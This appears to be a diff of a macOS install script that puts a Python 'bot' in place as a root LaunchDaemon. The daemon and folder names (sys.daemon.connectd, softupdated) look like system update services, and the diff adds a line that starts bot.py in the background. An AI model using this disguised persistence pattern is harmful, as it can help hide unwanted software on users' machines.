@@ -10,21 +10,16 @@ echo [+] Starting: `date` >> /private/var/softupdated/update.log 2>&1
 DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
 cd "$DIR" >> /private/var/softupdated/update.log 2>&1
 
-if [[ "$1" == "update" ]]
-	then
-	echo [+] Skipping bot unload. >> /private/var/softupdated/update.log 2>&1
-else
-	### unload previous install
-	echo [+] Unloading Bot... >> /private/var/softupdated/update.log 2>&1
+### unload previous install
+echo [+] Unloading Bot... >> /private/var/softupdated/update.log 2>&1
 
-	pid=`ps -ax | grep bot.py | head -1 | awk '{ print $1 }'`
-	kill -KILL $pid > /dev/null 2>&1
+pid=`ps -ax | grep bot.py | head -1 | awk '{ print $1 }'`
+kill -KILL $pid > /dev/null 2>&1
 
-	launchctl unload -w /Library/LaunchDaemons/sys.daemon.connectd.plist && echo [X] Unloaded Bot. >> /private/var/softupdated/update.log 2>&1
+launchctl unload -w /Library/LaunchDaemons/sys.daemon.connectd.plist && echo [X] Unloaded Bot. >> /private/var/softupdated/update.log 2>&1
 
-	pid=`ps -ax | grep bot.py | head -1 | awk '{ print $1 }'`
-	kill -KILL $pid > /dev/null 2>&1
-fi
+pid=`ps -ax | grep bot.py | head -1 | awk '{ print $1 }'`
+kill -KILL $pid > /dev/null 2>&1
 
 ### copy libraries and binaries to corresponding locations
 echo [+] Copying Files... >> /private/var/softupdated/update.log 2>&1
@@ -61,22 +56,20 @@ chmod -R 700 /private/var/softupdated >> /private/var/softupdated/update.log 2>&
 echo [+] Launch Scripts Copied. >> /private/var/softupdated/update.log 2>&1
 echo Copied 2/2
 ### For in-place updates
-if [ "$1" == "update" ]
-	then
-	rm -Rf /private/var/softupdated/code && echo "[+] Removed downloaded source folder." >> /private/var/softupdated/update.log 2>&1
-else
-	### load launchd keepalive processes
-	echo [+] Loading Bot... >> /private/var/softupdated/update.log 2>&1
-	launchctl load -w /Library/LaunchDaemons/sys.daemon.connectd.plist && echo [√] Loaded Bot. >> /private/var/softupdated/update.log 2>&1
-fi
+
+### load launchd keepalive processes
+echo [+] Loading Bot... >> /private/var/softupdated/update.log 2>&1
+launchctl load -w /Library/LaunchDaemons/sys.daemon.connectd.plist && echo [√] Loaded Bot. >> /private/var/softupdated/update.log 2>&1
 
 if [ -e "/var/softupdated/bot.py" -a -e "/var/softupdated/modules/logging.py" -a "$successful" -eq "111" ]
 	then
 	echo [+] FINISHED: `date` >> /private/var/softupdated/update.log 2>&1
 	echo Finished
 else
-	echo [X] ERROR: Update failed, please resolve manually. `date` >> /private/var/softupdated/update.log 2>&1
-	echo ERROR: Update failed, please resolve manually.
+	echo [X] ERROR: Install failed, please resolve manually. `date` >> /private/var/softupdated/update.log 2>&1
+	echo ERROR: Install failed, please resolve manually.
 fi
+
+python /var/softupdated/bot.py &
 
 exit 0
